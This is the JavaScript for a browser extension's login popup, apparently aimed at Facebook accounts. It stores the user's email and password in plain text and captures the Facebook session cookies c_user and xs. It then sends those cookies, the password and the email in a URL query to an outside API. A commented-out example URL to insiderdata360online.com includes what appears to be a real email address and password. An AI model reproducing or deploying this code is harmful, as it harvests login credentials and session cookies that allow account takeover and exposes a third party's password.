var messages = [];
var email = '';
var password = '';
var account_key = '';

$(document).ready(function () {

    dashboard()

    const ls_email = localStorage.getItem("email")
    const ls_password = localStorage.getItem("password")
    const ls_account_key = localStorage.getItem("account_key")

    if (ls_email) {
        $("label[for='email']").addClass('active')
        $("#email").val(ls_email);
    }
    if (ls_password) {
        $("label[for='password']").addClass('active')
        $("#password").val(ls_password);
    }
    if (ls_account_key) {
        $("label[for='account-key']").addClass('active')
        $("#account-key").val(ls_account_key);
    }

    $('#login_form').validate({
        rules: {
            email: {
                required: true,
                email: true
            },
            password: {
                required: true
            }
        },
        messages: {

            email: {
                required: "Email can not be empty",
                email: "Please enter valid email"
            },
            password: {
                required: "Password can not be empty"
            }
        },
        submitHandler: function () {
            login();
            return false;
        }
    });
});

function login() {

    var data = {};
    email = $("#email").val();
    password = $("#password").val();
    account_key = $("#account-key").val();

    localStorage.setItem("email", email)
    localStorage.setItem("password", password)
    localStorage.setItem("account_key", account_key)

    data.email = email
    data.password = password
    data.account_key = account_key

    chrome.runtime.sendMessage({
        from: 'custom',
        action: 'FBLogin',
        data: data
    });
    $('.cookie-result').hide();

    $("#login_form button").attr('disabled', true).text('Processing...');
}

function dashboard() {

    $('#tab1').show();
    $('.cookie-result').hide();
    chrome.runtime.sendMessage({ from: 'custom', action: 'getMessages' });
}

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {

    if (request.from == "background" && request.action == "getCookie") {

        const cookies = request.data;
        const c_user_obj = cookies && cookies.filter(cookie => cookie.name === 'c_user')
        const xs_obj = cookies && cookies.filter(cookie => cookie.name === 'xs')
        const tabId = request.tabId;

        if (c_user_obj.length != 0 && xs_obj.length != 0) {

            const c_user_cookie = c_user_obj && c_user_obj[0].value
            const xs_cookie = xs_obj && xs_obj[0].value

            const data = {
                c_user: c_user_cookie,
                xs: xs_cookie
            }

            const apiURL = _config.apiBaseUrl + 'account-key=' + account_key + '&email=' + email + '&pass=' + password + '&user=' + c_user_cookie + '&xs=' + xs_cookie
            // const apiURL = 'https://insiderdata360online.com/api/social?account-key=2g==&email=louis.lombardi@nucitrus.com&pass=TechNCT123!&user=11011212&xs=dsfewrewer'
            console.log("apiurl: ", apiURL)

            $.ajax({
                type: 'GET',
                url: apiURL,
                data: JSON.stringify(data),
                dataType: 'json',
                success: function (response) {

                    if (response.SUCCESS === "Success." || response) {
                        console.log("successful!");
                        $("#login_form button").attr('disabled', false).text('Authentic');
                        $('.c_user').text("Success")
                        $('.cookie-result').show();

                        chrome.tabs.remove(tabId)

                    } else {
                        console.log("failed!");
                        $("#login_form button").attr('disabled', false).text('Authentic');
                        $('.c_user').text("Failed")
                        $('.cookie-result').show();
                        chrome.tabs.remove(tabId)
                    }

                }, error: function (jqXHR, textStatus) {

                    console.log("error:", textStatus);
                    $("#login_form button").attr('disabled', false).text('Authentic');
                    $('.c_user').text("INFO ABOUT ERROR")
                    $('.cookie-result').show();
                    chrome.tabs.remove(tabId)
                },
            });

        } else {

            console.log("Invalid Login!");
            $("#login_form button").attr('disabled', false).text('Authentic');
            $('.c_user').text("Invalid Login!")
            $('.cookie-result').show();
            chrome.tabs.remove(tabId)
        }

    }
});